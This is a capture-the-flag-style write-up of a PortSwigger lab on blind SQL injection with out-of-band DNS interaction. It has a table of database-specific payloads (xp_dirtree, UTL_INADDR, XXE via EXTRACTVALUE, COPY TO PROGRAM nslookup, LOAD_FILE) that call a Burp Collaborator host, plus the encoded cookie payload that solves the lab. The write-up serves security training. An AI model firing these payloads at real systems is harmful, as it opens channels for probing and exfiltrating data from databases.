**<h2>Background:</h2>**
Out-of-Band (OAST) techniques is a method of exploiting SQL injection vulnerabilities when there is no 
immediate response or feedback from the application that reflects the results of the SQL query directly 
(as in time-based or error-based blind SQL injection). In OAST attacks, the attacker triggers an action 
that causes the database to make an external request (typically to an attacker-controlled server), 
allowing them to gather information indirectly.

The attacker makes use of functions in the database (or the underlying system) that can initiate HTTP, 
DNS, or other out-of-band network communications. 

The easiest and most reliable tool for using out-of-band techniques is **_Burp Collaborator_**. This is a 
server that provides custom implementations of various network services, including DNS. It allows us to 
detect when network interactions occur as a result of sending individual payloads to a vulnerable 
application.

> More Info on _**[Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator)**_

Triggering DNS queries is a common way to verify vulnerabilities by using an out-of-band (OOB) 
interaction. This can help identify issues such as **_SSRF_** (Server-Side Request Forgery), **_RCE_** 
(Remote Code Execution), **_SSTI_** (Server-Side Template Injection), **_XXE_** (XML External Entity 
Injection), **_HTTP header injection_**, and others. By inducing a DNS query, you can see if an 
application will interact with an external server, indicating a potential vulnerability.

The techniques for triggering a DNS query are specific to the type of database being used. For 
example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified 
domain:
>``'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--``

This causes the database to perform a lookup for the following domain:
>``0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net``

<table>
    <tr>
        <th>Database</th>
        <th>Vulnerability Type</th>
        <th>Technique for Triggering DNS Lookup</th>
        <th>Requirements</th>
    </tr>
    <tr>
        <td>Oracle</td>
        <td>XXE (XML External Entity)</td>
        <td>
            <code>
                SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;&gt;]&gt;'),'/l') FROM dual
            </code>
        </td>
        <td>Works on unpatched Oracle installations</td>
    </tr>
    <tr>
        <td>Oracle</td>
        <td>DNS Lookup via Built-In Function</td>
        <td>
            <code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code>
        </td>
        <td>Requires elevated privileges, works on patched Oracle installations</td>
    </tr>
    <tr>
        <td>Microsoft SQL Server</td>
        <td>DNS Lookup via Extended Stored Procedure</td>
        <td>
            <code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code>
        </td>
        <td>Works on Microsoft SQL Server with <code>xp_dirtree</code> enabled</td>
    </tr>
    <tr>
        <td>PostgreSQL</td>
        <td>OOB Interaction via Command Execution</td>
        <td>
            <code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code>
        </td>
        <td>Requires ability to execute commands, may need superuser permissions</td>
    </tr>
    <tr>
        <td>MySQL</td>
        <td>DNS Lookup via File Load (Windows Only)</td>
        <td>
            <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code>
        </td>
        <td>Works only on Windows installations of MySQL</td>
    </tr>
    <tr>
        <td>MySQL</td>
        <td>DNS Lookup via File Write (Windows Only)</td>
        <td>
            <code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</code>
        </td>
        <td>Works only on Windows installations of MySQL</td>
    </tr>
</table>


**<h2>Problem:</h2>**
The application uses a tracking cookie for analytics, and performs a SQL query containing the value 
of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, 
you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp 
Collaborator.

**<h2>Solution:</h2>**
- Go to Burp collaborator and copy the collaborator payload in this case it is : 
``334i3n0lzvfasvko0jcg38jrmiscg24r``
- Uncheck inculde server location and add ``.burpcollaborator.net`` after subdomain
- Insert following query in tracking id 
``'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//334i3n0lzvfasvko0jcg38jrmiscg24r.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--``
![alt text](/images/lab16dnslookup.png)